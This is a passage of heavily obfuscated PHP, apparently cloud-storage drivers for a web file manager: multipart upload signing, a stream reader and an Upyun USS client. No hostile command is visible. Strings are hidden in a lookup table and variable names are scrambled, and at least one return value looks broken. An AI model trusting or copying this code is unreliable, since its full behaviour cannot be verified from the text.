$¯¡„Ò™Ø; } public function multiUploadFormData($á–¾§å¢, $ÌöÛ£‡ğ = 3600) { $ŠèÂ¸Ÿ‘ =& $_SERVER[¹òÍ›æş]; $©Ÿ„„Âš = gmdate($ŠèÂ¸Ÿ‘[1455]); $¹“ŞèÑ€ = array(); $½Ä®Ç­ğ = $this->client->getUploadId($this->bucket, $á–¾§å¢, $¹“ŞèÑ€); if (!$½Ä®Ç­ğ) { return !1; } return array($ŠèÂ¸Ÿ‘[233] => $½Ä®Ç­ğ, $ŠèÂ¸Ÿ‘[192] => $this->getHost() . $ŠèÂ¸Ÿ‘[8] . $this->pathEncode($á–¾§å¢), $ŠèÂ¸Ÿ‘[234] => $©Ÿ„„Âš, $ŠèÂ¸Ÿ‘[104] => $á–¾§å¢); } public function multiUploadAuthData($ÜğˆÇúµ, $óáÈ¤¹Ü = array()) { $—†äÊÖÅ =& $_SERVER[¹òÍ›æş]; $ç·ÆÕî° = isset($óáÈ¤¹Ü[$—†äÊÖÅ[184]]) ? $óáÈ¤¹Ü[$—†äÊÖÅ[184]] : $—†äÊÖÅ[12]; $§­§Òä­ = $óáÈ¤¹Ü[$—†äÊÖÅ[104]]; unset($óáÈ¤¹Ü[$—†äÊÖÅ[104]]); if (isset($óáÈ¤¹Ü[$—†äÊÖÅ[235]])) { return $this->listUploadParts($§­§Òä­, $óáÈ¤¹Ü); } $ªÖú™ê = array(); if (isset($óáÈ¤¹Ü[$—†äÊÖÅ[1456]])) { $ªÖú™ê[$—†äÊÖÅ[1457]] = $óáÈ¤¹Ü[$—†äÊÖÅ[1456]]; } $Ä©‰Ò§É = explode($—†äÊÖÅ[194], $this->getHost()); $ï¡š»Äè = array($—†äÊÖÅ[1458] => $Ä©‰Ò§É[1], $—†äÊÖÅ[1459] => $—†äÊÖÅ[12], $—†äÊÖÅ[225] => $—†äÊÖÅ[130], $—†äÊÖÅ[269] => $óáÈ¤¹Ü[$—†äÊÖÅ[86]]); $ñöâã†‘ = $—†äÊÖÅ[238]; $õ¿–ŞéÇ = $—†äÊÖÅ[8] . $this->pathEncode($§­§Òä­) . $ç·ÆÕî°; $ø³¿ÅË– = $this->client->__getSignatureV4($ªÖú™ê, $ï¡š»Äè, $ñöâã†‘, $õ¿–ŞéÇ); if (strpos($ç·ÆÕî°, $—†äÊÖÅ[237]) === 0) { if (isset($ªÖú™ê[$—†äÊÖÅ[1457]])) { $é¸Ğ‰İŠ = $ªÖú™ê[$—†äÊÖÅ[1457]]; } else { if (isset($ø³¿ÅË–[$—†äÊÖÅ[1457]])) { $é¸Ğ‰İŠ = $ø³¿ÅË–[$—†äÊÖÅ[1457]]; } else { $é¸Ğ‰İŠ = hash($—†äÊÖÅ[267], $—†äÊÖÅ[12]); } } return array($—†äÊÖÅ[243] => $ø³¿ÅË–[$—†äÊÖÅ[243]], $—†äÊÖÅ[1457] => $é¸Ğ‰İŠ, $—†äÊÖÅ[234] => $ø³¿ÅË–[$—†äÊÖÅ[1460]]); } return $ø³¿ÅË–[$—†äÊÖÅ[243]]; } public function listUploadParts($Ì®åù, $ØïÌò…¯ = array()) { $Šıê¬Ôé =& $_SERVER[¹òÍ›æş]; $Éœ¹åî° = str_replace($Šıê¬Ôé[244], $Šıê¬Ôé[12], $ØïÌò…¯[$Šıê¬Ôé[184]]); $üíÈÑâî = $this->client->listParts($this->bucket, $Ì®åù, $Éœ¹åî°); if (!$üíÈÑâî) { return !1; } $Ã€ĞµÌ¯ = $Šıê¬Ôé[1461]; foreach ($üíÈÑâî as $Õ¹ö–Ùå) { $Ã€ĞµÌ¯ .= $Šıê¬Ôé[1462] . "\74\120\141\x72\x74\x4e\165\x6d\142\145\162\x3e{$Õ¹ö–Ùå[$Šıê¬Ôé[1416]]}\x3c\57\120\141\162\x74\116\x75\155\x62\x65\162\76\12" . "\x3c\x45\x54\141\147\x3e{$Õ¹ö–Ùå[$Šıê¬Ôé[1417]]}\74\57\105\x54\x61\147\x3e\12" . $Šıê¬Ôé[1463]; } $Ã€ĞµÌ¯ .= $Šıê¬Ôé[1464]; $à³¢õ§Û = array(); $Ù•ıŠ•š = explode($Šıê¬Ôé[194], $this->getHost()); $‹Ì°ûò€ = array($Šıê¬Ôé[1458] => $Ù•ıŠ•š[1], $Šıê¬Ôé[225] => $Šıê¬Ôé[130], $Šıê¬Ôé[269] => strlen($Ã€ĞµÌ¯)); $›Ğ˜»¬¥ = $Šıê¬Ôé[236]; $ñ‘ßúˆ‰ = $Šıê¬Ôé[8] . $this->pathEncode($Ì®åù) . $ØïÌò…¯[$Šıê¬Ôé[184]]; $ı„Éú = $this->client->__getSignatureV4($à³¢õ§Û, $‹Ì°ûò€, $›Ğ˜»¬¥, $ñ‘ßúˆ‰, $Ã€ĞµÌ¯); return array($Šıê¬Ôé[243] => $ı„Éú[$Šıê¬Ôé[243]], $Šıê¬Ôé[234] => $ı„Éú[$Šıê¬Ôé[1460]], $Šıê¬Ôé[245] => $üíÈÑâî, $Šıê¬Ôé[1457] => $ı„Éú[$Šıê¬Ôé[1457]]); } public function link($úÁµ¿¼ê, $çËòˆÕ = array()) { return parent::link($úÁµ¿¼ê, $çËòˆÕ); } public function fileOut($­¨«ìÎ†, $ø‹ÄÄÅ¨ = false, $ş±ƒ®ß— = false, $İ½à×´º = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[¹òÍ›æş][1465])) { return parent::fileOutServer($­¨«ìÎ†, $ø‹ÄÄÅ¨, $ş±ƒ®ß—, $İ½à×´º); } parent::fileOut($­¨«ìÎ†, $ø‹ÄÄÅ¨, $ş±ƒ®ß—, $İ½à×´º); } public function fileOutImage($¢Šã½Ü‚, $Âû¶Û¿õ = 250) { if (strstr($this->endpoint, $_SERVER[¹òÍ›æş][1465])) { return parent::fileOutImageServer($¢Šã½Ü‚, $Âû¶Û¿õ); } parent::fileOutImage($¢Šã½Ü‚, $Âû¶Û¿õ); } public function fileOutLink($öéà°€‚) { $¥œˆ¿•‚ =& $_SERVER[¹òÍ›æş]; if (substr($öéà°€‚, 0, 7) == $¥œˆ¿•‚[1358]) { $öéà°€‚ = $¥œˆ¿•‚[1359] . substr($öéà°€‚, 7); } header($¥œˆ¿•‚[171] . $öéà°€‚); die; } public function getHost() { $áĞ±Ñè½ =& $_SERVER[¹òÍ›æş]; $›Äºíğ = str_rtrim(parent::getHost(), $áĞ±Ñè½[8] . $this->bucket); $›Äºíğ = explode($áĞ±Ñè½[194], $›Äºíğ); return $›Äºíğ[0] . $áĞ±Ñè½[194] . $this->bucket . $áĞ±Ñè½[10] . $›Äºíğ[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($Ê•¼˜ßÕ, $Å©óŞ÷© = 0) { parent::__construct(); $this->source = $Ê•¼˜ßÕ; $this->sourceSize = $Å©óŞ÷©; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($„Ûªƒ†É = false) { return $this->sourceSize; } public function getContent($İ …İ½• = false) { return $this->fileSubstr($İ …İ½•, 0, $this->sourceSize); } public function fileSubstr($ÕíÕ®ş¹ = false, $îâ‡í»” = 0, $»³â–ë = 0) { if (!$»³â–ë) { $»³â–ë = $this->sourceSize; } $Ó†“ÀĞ¨ = $this->sourceSize - $îâ‡í»”; if ($»³â–ë >= $Ó†“ÀĞ¨) { $»³â–ë = $Ó†“ÀĞ¨; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $îâ‡í»”, $»³â–ë); } if ($this->sourceType == self::TYPE_FILE) { if ($»³â–ë <= 0) { return $_SERVER[¹òÍ›æş][12]; } $õø¯úÛ = ftell($this->source); fseek_64($this->source, $õø¯úÛ + $îâ‡í»”); $µ€•º³¸ = @fread($this->source, $»³â–ë); fseek_64($this->source, $õø¯úÛ); return $µ€•º³¸; } } public function hashMd5($âö˜ˆİ = false) { return md5($this->getContent()); } public static function hash($çäèÏİÕ, $¨èåüß = 0) { $Ë‚™—¿ã = new PathDriverStream($çäèÏİÕ, $¨èåüß); return $Ë‚™—¿ã->hashSimple($çäèÏİÕ); } public static function md5($›ä¾±Õê, $£ÀçÏ’ì = 0) { $ªÃÚëØÂ = new PathDriverStream($›ä¾±Õê, $£ÀçÏ’ì); return $ªÃÚëØÂ->hashMd5($›ä¾±Õê); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\x74\160\x3a\57\x2f\166\60\x2e\141\x70\x69\x2e\165\160\x79\165\156\x2e\143\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($İ®óÔ”) { parent::__construct(); $this->_init($İ®óÔ”); } public function _init($òÕÆû’Ä) { $Şôğ¯»‚ =& $_SERVER[¹òÍ›æş]; foreach ($òÕÆû’Ä as $¾øÇ => $†ë¹›ì) { if (isset($this->{$¾øÇ})) { $this->{$¾øÇ} = $†ë¹›ì; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($Şôğ¯»‚[1466] . LNG($Şôğ¯»‚[1397])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($ûÕÄÏ¿ë, $£‰€¸ïë = "\x47\x45\x54") { $§Çï¤®Ñ =& $_SERVER[¹òÍ›æş]; $ËåÈ‚¦ = gmdate($§Çï¤®Ñ[1430]); $¤Â©ç” = base64_encode(hash_hmac($§Çï¤®Ñ[1467], "{$£‰€¸ïë}\46{$ûÕÄÏ¿ë}\46{$ËåÈ‚¦}", md5("{$this->userpass}"), !0)); $ìåû§öæ = array("\x41\x75\x74\x68\157\162\x69\x7a\141\x74\x69\x6f\x6e\x3a\x55\x50\x59\125\x4e\x20{$this->username}\72{$¤Â©ç”}", "\104\141\x74\x65\x3a{$ËåÈ‚¦}"); return $ìåû§öæ; } public function ussRequest($ÓÖ—ËÔ, $²®ù¹ó¸ = "\107\105\x54", $†¨¬¹µï = false, $¨í‹Ù€‹ = false, $¾é¦©¦á = false) { $à‰Í‘êê =& $_SERVER[¹òÍ›æş]; $ÓÖ—ËÔ = trim($ÓÖ—ËÔ, $à‰Í‘êê[8]); $²ıÀ£èº = "\x2f{$this->bucket}\x2f{$ÓÖ—ËÔ}"; $µª²³…ƒ = $this->ussHeaders($²ıÀ£èº, $²®ù¹ó¸); if ($¨í‹Ù€‹) { $µª²³…ƒ = array_merge($µª²³…ƒ, $¨í‹Ù€‹); } $¨ºş½¾ = url_request($this->endpoint . $²ıÀ£èº, $²®ù¹ó¸, $†¨¬¹µï, $µª²³…ƒ, $¾é¦©¦á); if (!$¨ºş½¾) { return array($à‰Í‘êê[1239] => !1, $à‰Í‘êê[1229] => $à‰Í‘êê[1468]); } if (strtolower($²®ù¹ó¸) == $à‰Í‘êê[207] || in_array($¨ºş½¾[$à‰Í‘êê[1239]], array($à‰Í‘êê[251], $à‰Í‘êê[1469]))) { $†¨¬¹µï = $¨ºş½¾[$à‰Í‘êê[1470]]; } else { $†¨¬¹µï = json_decode($¨ºş½¾[$à‰Í‘êê[1229]], !0); if (!$†¨¬¹µï) { $†¨¬¹µï = $¨ºş½¾[$à‰Í‘êê[1229]]; } else { if (!$¨ºş½¾[$à‰Í‘êê[780]] && isset($†¨¬¹µï[$à‰Í‘êê[1471]])) { $†¨¬¹µï = $†¨¬¹µï[$à‰Í‘êê[1471]]; } } } return array($à‰Í‘êê[1239] => $¨ºş½¾[$à‰Í‘êê[780]], $à‰Í‘êê[1229] => $†¨¬¹µï); } public function mkfile($¯ó¢§, $±¼å™åÚ = '', $‹¶Ÿ¡¨ü = REPEAT_RENAME) { if ($this->setContent($¯ó¢§, $±¼å™åÚ)) { return $this->getPathOuter($¯ó¢§); } return !1; } public function mkdir($Èˆ²Ğ£, $²ùô¹‚ë = REPEAT_SKIP) { $¹ÉÔå©Î =& $_SERVER[¹òÍ›æş]; $¨ıß‘Æ = trim($Èˆ²Ğ£, $¹ÉÔå©Î[8]); if ($this->_isFolder($¨ıß‘Æ)) { return $this->getPathOuter($¨ıß‘Æ); } $İÀŸêÇ­ = array($¹ÉÔå©Î[1472]); $íäğüıµ = $this->ussRequest($¨ıß‘Æ, $¹ÉÔå©Î[236], !1, $İÀŸêÇ­); return $íäğüıµ[$¹ÉÔå©Î[1239]] ? $this->getPathOuter($¨ıß‘Æ) : !1; } public function copyFile($ƒ¯Ì‡¦ş, $ıÇ¿ Úç) { $§¤ó§ó =& $_SERVER[¹òÍ›æş]; $¼àêÇçæ = array($§¤ó§ó[1473] . "\57{$this->bucket}\57{$ƒ¯Ì‡¦ş}", $§¤ó§ó[1474]); $ÔøÇ•öÔ = $this->ussRequest($ıÇ¿ Úç, $§¤ó§ó[238], !1, $¼àêÇçæ); return $ÔøÇ•öÔ[$§¤ó§ó[1239]] ? !0 : $this->getPathOuter($ıÇ¿ Úç); } public function moveFile($ ÇÑ×, $Œæ›±œ») { $†ñÃ¹É =& $_SERVER[¹òÍ›æş]; $Áşë…– = array($†ñÃ¹É[1475] . "\x2f{$this->bucket}\57{$ ÇÑ×}", $†ñÃ¹É[1474]); $Ñ†òà©ú = $this->ussRequest($Œæ›±œ», $†ñÃ¹É[238], !1, $Áşë…–); return $Ñ†òà©ú[$†ñÃ¹É[1239]] ? !0 : $this->getPathOuter($Œæ›±œ»); } public function delFile($Ô¼ÛÉüŸ) { $æì®ØÎ =& $_SERVER[¹òÍ›æş]; $‰‡’ÁÙê = $this->ussRequest($Ô¼ÛÉüŸ, $æì®ØÎ[1476]); return $‰‡’ÁÙê[$æì®ØÎ[1239]] ? !0 : !1; } public function delFolder($óÂ¹„ù) { $Ìë…²¸‚ =& $_SERVER[¹òÍ›æş]; if (!$this->exist($óÂ¹„ù)) { return !0; } $this->listItemCache = !1; $¢ÌÒÌË = $™ŞÎáˆ = array(); $this->fileList($óÂ¹„ù, $¢ÌÒÌË, $™ŞÎáˆ, !0); $this->listItemCache = !0; foreach ($™ŞÎáˆ as $×‚ÎßÙ) { $Õ’Ğ‡Ñã = $this->ussRequest($×‚ÎßÙ[$Ìë…²¸‚[32]], $Ìë…²¸‚[1476]); if (!$Õ’Ğ‡Ñã[$Ìë…²¸‚[1239]]) { return !1; } } foreach ($¢ÌÒÌË as $ÀŒ°Ò©) { $Õ’Ğ‡Ñã = $this->ussRequest($ÀŒ°Ò©, $Ìë…²¸‚[1476]); if (!$Õ’Ğ‡Ñã[$Ìë…²¸‚[1239]]) { return !1; } } $Õ’Ğ‡Ñã = $this->ussRequest($óÂ¹„ù, $Ìë…²¸‚[1476]); return $Õ’Ğ‡Ñã[$Ìë…²¸‚[1239]]; } public function rename($±ÕæÜä¤, $‰Î­« ) { if ($this->isFile($±ÕæÜä¤)) { $‰Î­«  = get_path_father($±ÕæÜä¤) . $‰Î­« ; return $this->moveFile($±ÕæÜä¤, $‰Î­« ); } return $this->renameObject($±ÕæÜä¤, $‰Î­« ); } public function fileInfo($šœûÌ”µ, $„ÜÒì…” = false, $«»‹—´Ï = array()) { $õ®ĞÅ¨« =& $_SERVER[¹òÍ›æş]; $ùºÎ´ú¥ = array($õ®ĞÅ¨«[32] => $this->pathThis($šœûÌ”µ), $õ®ĞÅ¨«[94] => $this->getPathOuter($õ®ĞÅ¨«[8] . $šœûÌ”µ), $õ®ĞÅ¨«[33] => $õ®ĞÅ¨«[210], $õ®ĞÅ¨«[86] => isset($«»‹—´Ï[$õ®ĞÅ¨«[86]]) ? $«»‹—´Ï[$õ®ĞÅ¨«[86]] : 0, $õ®ĞÅ¨«[184] => $this->ext($šœûÌ”µ)); if ($„ÜÒì…”) { return $ùºÎ´ú¥; } $ùºÎ´ú¥[$õ®ĞÅ¨«[211]] = $ùºÎ´ú¥[$õ®ĞÅ¨«[95]] = 0; $ùºÎ´ú¥[$õ®ĞÅ¨«[212]] = $ùºÎ´ú¥[$õ®ĞÅ¨«[213]] = !0; if (empty($«»‹—´Ï)) { $«»‹—´Ï = $this->objectMeta($šœûÌ”µ); if (!$«»‹—´Ï) { return $ùºÎ´ú¥; } } $ùºÎ´ú¥[$õ®ĞÅ¨«[211]] = intval($«»‹—´Ï[$õ®ĞÅ¨«[1477]]); $ùºÎ´ú¥[$õ®ĞÅ¨«[95]] = intval($«»‹—´Ï[$õ®ĞÅ¨«[1478]]); $ùºÎ´ú¥[$õ®ĞÅ¨«[86]] = $«»‹—´Ï[$õ®ĞÅ¨«[86]]; return $ùºÎ´ú¥; } public function folderInfo($§ğ˜á…•, $öœ÷ÔØ§ = false) { $ì”¨ı§ =& $_SERVER[¹òÍ›æş]; $Æ­‚‘»Œ = array($ì”¨ı§[32] => $this->pathThis($§ğ˜á…•), $ì”¨ı§[94] => $this->getPathOuter($ì”¨ı§[8] . $§ğ˜á…•), $ì”¨ı§[33] => $ì”¨ı§[85]); if ($öœ÷ÔØ§) { return $Æ­‚‘»Œ; } $Æ­‚‘»Œ[$ì”¨ı§[211]] = $Æ­‚‘»Œ[$ì”¨ı§[95]] = 0; $Æ­‚‘»Œ[$ì”¨ı§[212]] = $Æ­‚‘»Œ[$ì”¨ı§[213]] = !0; if (empty($¿Ä˜Ñ™ )) { $¿Ä˜Ñ™  = $this->objectMeta($§ğ˜á…•); if (!$¿Ä˜Ñ™ ) { return $Æ­‚‘»Œ; } } $Æ­‚‘»Œ[$ì”¨ı§[211]] = intval($¿Ä˜Ñ™ [$ì”¨ı§[1477]]); $Æ­‚‘»Œ[$ì”¨ı§[95]] = intval($¿Ä˜Ñ™ [$ì”¨ı§[1478]]); return $Æ­‚‘»Œ; } private function listObjs($ıı˜Øõ, $¹ëö¸İ³ = 0, $ã®º³ßğ = 1000) { $êÍ½×’¨ =& $_SERVER[¹òÍ›æş]; $Ò£ÂÖ•ä = array($êÍ½×’¨[1479], $êÍ½×’¨[1480] . $ã®º³ßğ); if ($¹ëö¸İ³) { $Ò£ÂÖ•ä[] = $êÍ½×’¨[1481] . $¹ëö¸İ³; } $Âì…°×Æ = $this->ussRequest($ıı˜Øõ, $êÍ½×’¨[240], !1, $Ò£ÂÖ•ä); return !$Âì…°×Æ[$êÍ½×’¨[1239]] ? !1 : $Âì…°×Æ[$êÍ½×’¨[1229]]; } private function fileList($„Èí¤ª, &$ ¤Ô¿Î, &$æã¨œÇ–, $Ğ£ÏçÀ€ = false) { $™ŞªŠó„ =& $_SERVER[¹òÍ›æş]; $œ é˜æÔ = $™ŞªŠó„[12]; $¾ôˆßõê = 1000; $ÎºöÒóû = rtrim($„Èí¤ª, $™ŞªŠó„[8]) . $™ŞªŠó„[8]; while (!0) { check_abort(); $ÓÜŒë«‘ = $this->listObjs($„Èí¤ª, $œ é˜æÔ, $¾ôˆßõê); if (!$ÓÜŒë«‘) { return !1; } $œ é˜æÔ = isset($ÓÜŒë«‘[$™ŞªŠó„[1482]]) ? $ÓÜŒë«‘[$™ŞªŠó„[1482]] : $™ŞªŠó„[12]; $ºíÑêª = isset($ÓÜŒë«‘[$™ŞªŠó„[1483]]) ? $ÓÜŒë«‘[$™ŞªŠó„[1483]] : array(); foreach ($ºíÑêª as $–ìñ’») { $íÇ«¼Ì = $–ìñ’»[$™ŞªŠó„[33]] == $™ŞªŠó„[85] ? !0 : !1; $Á«»Ó¤ = ltrim($ÎºöÒóû . $–ìñ’»[$™ŞªŠó„[32]], $™ŞªŠó„[8]) . ($íÇ«¼Ì ? $™ŞªŠó„[8] : $™ŞªŠó„[12]); $±ìÀÕüş = array($™ŞªŠó„[32] => $Á«»Ó¤, $™ŞªŠó„[33] => $íÇ«¼Ì ? $™ŞªŠó„[85] : $™ŞªŠó„[210], $™ŞªŠó„[86] => $–ìñ’»[$™ŞªŠó„[375]], $™ŞªŠó„[1478] => $–ìñ’»[$™ŞªŠó„[1484]]); $this->cacheMethodInfoSet($Á«»Ó¤, $íÇ«¼Ì, $±ìÀÕüş); if ($íÇ«¼Ì) { $ ¤Ô¿Î[] = $Á«»Ó¤; if ($Ğ£ÏçÀ€) { $this->fileList($Á«»Ó¤, $ ¤Ô¿Î, $æã¨œÇ–, $Ğ£ÏçÀ€); } continue; } $æã¨œÇ–[] = $±ìÀÕüş; } if (count($ºíÑêª) < $¾ôˆßõê) { break; } } $this->cacheMethodInfoSet($„Èí¤ª, !0); } public function listPath($Ü¡ßÍÍ‰, $èŠ¹­ö = false) { $„›ßøœ =& $_SERVER[¹òÍ›æş]; $Ôã˜¨‹ş = $ü¢ç’öê = array(); $this->fileList($Ü¡ßÍÍ‰, $Ôã˜¨‹ş, $ü¢ç’öê); foreach ($Ôã˜¨‹ş as $ò‚³¬ä => $Õï•Ä³²) { $Ôã˜¨‹ş[$ò‚³¬ä] = $this->folderInfo($Õï•Ä³², $èŠ¹­ö); } foreach ($ü¢ç’öê as $ò‚³¬ä => $Õï•Ä³²) { $ü¢ç’öê[$ò‚³¬ä] = $this->fileInfo($Õï•Ä³²[$„›ßøœ[32]], $èŠ¹­ö, $Õï•Ä³²); } return array($„›ßøœ[92] => $Ôã˜¨‹ş, $„›ßøœ[93] => $ü¢ç’öê); } public function has($¬Ä·øæ», $ˆùÛÌé = false, $…ùÜ§ŞÍ = true) { $‡¿¤´¾± =& $_SERVER[¹òÍ›æş]; $×€×Ô¶Ÿ = $‡¿¤´¾±[12]; $ÌÔãÑ = 500; $™õş“Ñ€ = 0; $ ·´‡½„ = 0; $ŒòõƒØÄ = rtrim($¬Ä·øæ», $‡¿¤´¾±[8]) . $‡¿¤´¾±[8]; while (!0) { check_abort(); $õ®òÕËÓ = $this->listObjs($¬Ä·øæ», $×€×Ô¶Ÿ, $ÌÔãÑ); if (!$õ®òÕËÓ) { return !1; } $×€×Ô¶Ÿ = isset($õ®òÕËÓ[$‡¿¤´¾±[1482]]) ? $õ®òÕËÓ[$‡¿¤´¾±[1482]] : $‡¿¤´¾±[12]; $Öá“¢÷ = isset($õ®òÕËÓ[$‡¿¤´¾±[1483]]) ? $õ®òÕËÓ[$‡¿¤´¾±[1483]] : array(); if (empty($Öá“¢÷)) { break; } $ø²¼´ºÓ = array_filter($Öá“¢÷, function ($ò˜¡ï»ã) { $±¾›³™ =& $_SERVER[¹òÍ›æş]; return $ò˜¡ï»ã[$±¾›³™[33]] == $±¾›³™[85]; }); $Œª¨½ƒ = count($Öá“¢÷); $ø²¼´ºÓ = count($ø²¼´ºÓ); $Ğçõâ‚ş = $Œª¨½ƒ - $ø²¼´ºÓ; if ($ˆùÛÌé) { $ ·´‡½„ += $ø²¼´ºÓ; $™õş“Ñ€ += $Ğçõâ‚ş; if ($Œª¨½ƒ < $ÌÔãÑ) { break; } continue; } if ($…ùÜ§ŞÍ) { if ($Ğçõâ‚ş) { return !0; } } else { if ($ø²¼´ºÓ) { return !0; } } if ($Œª¨½ƒ < $ÌÔãÑ) { break; } } if ($ˆùÛÌé) { return array($‡¿¤´¾±[217] => $™õş“Ñ€, $‡¿¤´¾±[218] => $ ·´‡½„); } return !1; } public function listAll($¹œ¹ª¶Å) { $ç…®€ºõ =& $_SERVER[¹òÍ›æş]; $ÉÙøû‘¾ = $Ü¨©Öá = array(); $this->fileList($¹œ¹ª¶Å, $ÉÙøû‘¾, $Ü¨©Öá, !0); $Â×ğôÈİ = array_to_keyvalue($Ü¨©Öá, $ç…®€ºõ[32]); foreach ($ÉÙøû‘¾ as $ÇÇİ¶‹) { if (is_string($ÇÇİ¶‹)) { $Â×ğôÈİ[$ÇÇİ¶‹] = array($ç…®€ºõ[86] => 0); } } return $this->listAllFiles($¹œ¹ª¶Å, $Â×ğôÈİ); } public function canRead($Õ¿’ö›æ) { return $this->exist($Õ¿’ö›æ) ? !0 : !1; } public function canWrite($÷£×¸Ú) { return $this->exist($÷£×¸Ú) ? !0 : !1; } public function getContent($ŒõŞ½¶Ñ) { return $this->fileSubstr($ŒõŞ½¶Ñ, 0, -1); } public function setContent($üÎÙüÌÂ, $µòÓ¨Åï = '') { $ì¾‹Òáë =& $_SERVER[¹òÍ›æş]; if (!$µòÓ¨Åï) { $‡îŞéÔ£ = $this->ussRequest($üÎÙüÌÂ, $ì¾‹Òáë[236]); return $‡îŞéÔ£[$ì¾‹Òáë[1239]]; } $áüÒğ¾ù = $this->tempFile($this->pathThis($üÎÙüÌÂ)); file_put_contents($áüÒğ¾ù, $µòÓ¨Åï); if ($this->upload($üÎÙüÌÂ, $áüÒğ¾ù)) { $this->tempFileRemve($áüÒğ¾ù); return !0; } return !1; } public function fileSubstr($¢²±ñÍ, $Ë¨Øæİğ, $ÅÚ¢¡íû) { $‘şì”” =& $_SERVER[¹òÍ›æş]; if (!($ôôÔâî = $this->link($¢²±ñÍ))) { return !1; } $ı¹Ø®³¯ = !1; if ($ÅÚ¢¡íû > 0) { $ÑÈ«•Ââ = $Ë¨Øæİğ + $ÅÚ¢¡íû - 1; $ı¹Ø®³¯ = array($‘şì””[1445] . $Ë¨Øæİğ . $‘şì””[424] . $ÑÈ«•Ââ); } $ÑÕğ‰Úî = url_request($ôôÔâî, $‘şì””[240], !1, $ı¹Ø®³¯); return $ÑÕğ‰Úî[$‘şì””[780]] ? $ÑÕğ‰Úî[$‘şì””[1229]] : !1; } public function upload($ãÅƒœÕ™, $‹İÎªâŸ, $ÍÌ†Š¤Ù = false, $ô„ø­÷¿ = REPEAT_REPLACE) { $Åâ¼ŸÀ =& $_SERVER[¹òÍ›æş]; $ê©ëÖ‚« = IO::size($‹İÎªâŸ); if ($ê©ëÖ‚« <= 1024 * 1024 * 200) { $ˆ³¥¶‡ = array($Åâ¼ŸÀ[1485] . $‹İÎªâŸ); $ËÔ±‡¹ = $this->ussRequest($ãÅƒœÕ™, $Åâ¼ŸÀ[238], $ˆ³¥¶‡); return $ËÔ±‡¹[$Åâ¼ŸÀ[1239]] ? $this->getPathOuter($ãÅƒœÕ™) : !1; } $Å³…½ = 1024 * 1024 * 10; $Œü“È³ = array($Åâ¼ŸÀ[1486], $Åâ¼ŸÀ[1487] . $ê©ëÖ‚«, $Åâ¼ŸÀ[1488], $Åâ¼ŸÀ[1489] . $Å³…½); $ËÔ±‡¹ = $this->ussRequest($ãÅƒœÕ™, $Åâ¼ŸÀ[238], !1, $Œü“È³); if (!$ËÔ±‡¹[$Åâ¼ŸÀ[1239]]) { return !1; } $ò««ò–Ô = $ËÔ±‡¹[$Åâ¼ŸÀ[1229]]; $íóãáóï = 0; $ªÂ¢ñ‡æ = $ò««ò–Ô[$Åâ¼ŸÀ[1490]]; $œî´²ßœ = fopen($‹İÎªâŸ, $Åâ¼ŸÀ[1394]); if (!$œî´²ßœ) { return !1; } do { $…Ûúû¼¹ = $ò««ò–Ô[$Åâ¼ŸÀ[1491]]; fseek_64($œî´²ßœ, $íóãáóï); $ì—ùÉ±Ä = fread($œî´²ßœ, $…Ûúû¼¹); $¦ãõ–æ¡ = 0; do { $¦ãõ–æ¡++; $ò««ò–Ô = $this->uploadPart($ãÅƒœÕ™, $ò««ò–Ô, $ì—ùÉ±Ä); } while (!$ò««ò–Ô && $¦ãõ–æ¡ < 3); if (!$ò««ò–Ô) { return !1; } $ªÂ¢ñ‡æ = $ò««ò–Ô[$Åâ¼ŸÀ[1490]]; $íóãáóï += $…Ûúû¼¹; } while ($ªÂ¢ñ‡æ != -1); fclose($œî´²ßœ); $Œü“È³ = array($Åâ¼ŸÀ[1492], $Åâ¼ŸÀ[1493] . $ò««ò–Ô[$Åâ¼ŸÀ[1494]], $Åâ¼ŸÀ[1488]); $ËÔ±‡¹ = $this->ussRequest($ãÅƒœÕ™, $Åâ¼ŸÀ[238], !1, $Œü“È³); return $ËÔ±‡¹[$Åâ¼ŸÀ[1239]] ? $this->getPathOuter($¼ƒÚõşù) : !1; } private function uploadPart($­ÀÜÈÔñ, $Ë³İÄ²«, &$šèÁíÙ) { $œµÃĞÒ× =& $_SERVER[¹òÍ›æş]; $·£«úŒ„ = array($œµÃĞÒ×[1495], $œµÃĞÒ×[1493] . $Ë³İÄ²«[$œµÃĞÒ×[1494]], $œµÃĞÒ×[1496] . $Ë³İÄ²«[$œµÃĞÒ×[1490]], $œµÃĞÒ×[152] . $Ë³İÄ²«[$œµÃĞÒ×[1491]]); $•À†ê½¢ = $this->ussRequest($­ÀÜÈÔñ, $œµÃĞÒ×[238], $šèÁíÙ, $·£«úŒ„); return !$•À†ê½¢[$œµÃĞÒ×[1239]] ? $•À†ê½¢[$œµÃĞÒ×[1239]] : $•À†ê½¢[$œµÃĞÒ×[1229]]; } public function uploadFormData($ƒ¶ˆ¼ë, $ŒÙ·¸¹× = 3600) { return $this->uploadPolicy($ƒ¶ˆ¼ë, $ŒÙ·¸¹×); } public function multiUploadFormData($†ÜÃºóù, $‹¹ó‡‹è = 3600) { $åà÷¨ÎË =& $_SERVER[¹òÍ›æş]; $”¹íÜØŒ = (int) $GLOBALS[$åà÷¨ÎË[7]][$åà÷¨ÎË[86]]; return $this->uploadPolicy($†ÜÃºóù, $‹¹ó‡‹è, $”¹íÜØŒ); } private function uploadPolicy($˜ŸÁµÙü, $Ïû©ˆâÂ = 3600, $Â¿¨«„¡ = 0) { $Æßî–û… =& $_SERVER[¹òÍ›æş]; $ËÀ¼ìç = $Æßî–û…[8] . $this->bucket; $ ı×Àƒé = gmdate($Æßî–û…[1430]); $²¿»º¥Ü = array($Æßî–û…[1497] => $this->bucket, $Æßî–û…[1498] => $˜ŸÁµÙü, $Æßî–û…[1499] => time() + $Ïû©ˆâÂ, $Æßî–û…[1500] => $ ı×Àƒé); if ($Â¿¨«„¡) { $²¿»º¥Ü[$Æßî–û…[1410]] = $Â¿¨«„¡; } $¢ÃºûªĞ = 